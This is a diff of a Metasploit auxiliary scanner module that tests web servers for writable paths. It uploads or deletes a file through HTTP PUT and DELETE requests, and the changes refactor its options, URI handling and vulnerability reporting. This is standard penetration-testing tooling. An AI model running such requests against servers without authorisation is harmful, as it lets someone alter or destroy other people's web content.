@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -14,13 +10,13 @@ require 'msf/core'
 class Metasploit4 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
+	include Msf::Auxiliary::WmapScanDir
 	include Msf::Auxiliary::Scanner
 	include Msf::Auxiliary::Report
 
 	def initialize
 		super(
 			'Name'        => 'HTTP Writable Path PUT/DELETE File Access',
-			'Version'     => '$Revision$',
 			'Description'    => %q{
 				This module can abuse misconfigured web servers to upload and delete web content
 				via PUT and DELETE HTTP requests. Set ACTION to either PUT or DELETE.
@@ -49,8 +45,9 @@ class Metasploit4 < Msf::Auxiliary
 
 		register_options(
 			[
-				OptString.new('PATH', [true,  "The path to attempt to write or delete", "/msf_http_put_test.txt"]),
-				OptString.new('DATA', [false, "The data to upload into the file", "msf test file"]),
+				OptString.new('PATH', [true,  "The path to attempt to write or delete", "/"]),
+				OptString.new('FILENAME', [true,  "The file to attempt to write or delete", "msf_http_put_test.txt"]),
+				OptString.new('FILEDATA', [false, "The data to upload into the file", "msf test file"]),
 				OptString.new('ACTION', [true, "PUT or DELETE", "PUT"])
 			], self.class)
 	end
@@ -84,7 +81,7 @@ class Metasploit4 < Msf::Auxiliary
 		begin
 			res = send_request_cgi(
 				{
-					'uri'    => path,
+					'uri'    => normalize_uri(path),
 					'method' => 'PUT',
 					'ctype'  => 'text/plain',
 					'data'   => data,
@@ -105,7 +102,7 @@ class Metasploit4 < Msf::Auxiliary
 		begin
 			res = send_request_cgi(
 				{
-					'uri'    => path,
+					'uri'    => normalize_uri(path),
 					'method' => 'DELETE',
 					'ctype'  => 'text/html',
 				}, 20
@@ -123,10 +120,13 @@ class Metasploit4 < Msf::Auxiliary
 	#
 	def run_host(ip)
 		path   = datastore['PATH']
-		data   = datastore['DATA']
+		data   = datastore['FILEDATA']
 
-		#Add "/" if necessary
-		path = "/#{path}" if path[0,1] != '/'
+		if path[-1,1] != '/'
+			path += '/'
+		end
+
+		path += datastore['FILENAME']
 
 		case action.name
 		when 'PUT'
@@ -138,17 +138,18 @@ class Metasploit4 < Msf::Auxiliary
 
 			#Upload file
 			res = do_put(path, data)
-			vprint_status("Reply: #{res.code.to_s}")
+			vprint_status("Reply: #{res.code.to_s}") if not res.nil?
 
 			#Check file
 			if not res.nil? and file_exists(path, data)
-				print_good("File uploaded: #{ip}:#{rport}#{path}")
+				turl = "#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}"
+				print_good("File uploaded: #{turl}")
 				report_vuln(
 					:host         => ip,
 					:port         => rport,
 					:proto        => 'tcp',
-					:name         => self.fullname,
-					:info         => "PUT Enabled",
+					:name         => self.name,
+					:info         => "Module #{self.fullname} confirmed write access to #{turl} via PUT",
 					:refs         => self.references,
 					:exploited_at => Time.now.utc
 				)
@@ -168,20 +169,21 @@ class Metasploit4 < Msf::Auxiliary
 
 			#Delete our file
 			res = do_delete(path)
-			vprint_status("Reply: #{res.code.to_s}")
+			vprint_status("Reply: #{res.code.to_s}") if not res.nil?
 
 			#Check if DELETE was successful
 			if res.nil? or file_exists(path, data)
 				print_error("DELETE failed. File is still there.")
 			else
-				print_good("File deleted: #{ip}:#{rport}#{path}")
+				turl = "#{(ssl ? 'https' : 'http')}://#{ip}:#{rport}#{path}"
+				print_good("File deleted: #{turl}")
 				report_vuln(
 					:host         => ip,
 					:port         => rport,
 					:proto        => 'tcp',
-					:sname        => 'http',
-					:name         => self.fullname,
-					:info         => "DELETE ENABLED",
+					:sname => (ssl ? 'https' : 'http'),
+					:name         => self.name,
+					:info         => "Module #{self.fullname} confirmed write access to #{turl} via DELETE",
 					:refs         => self.references,
 					:exploited_at => Time.now.utc
 				)
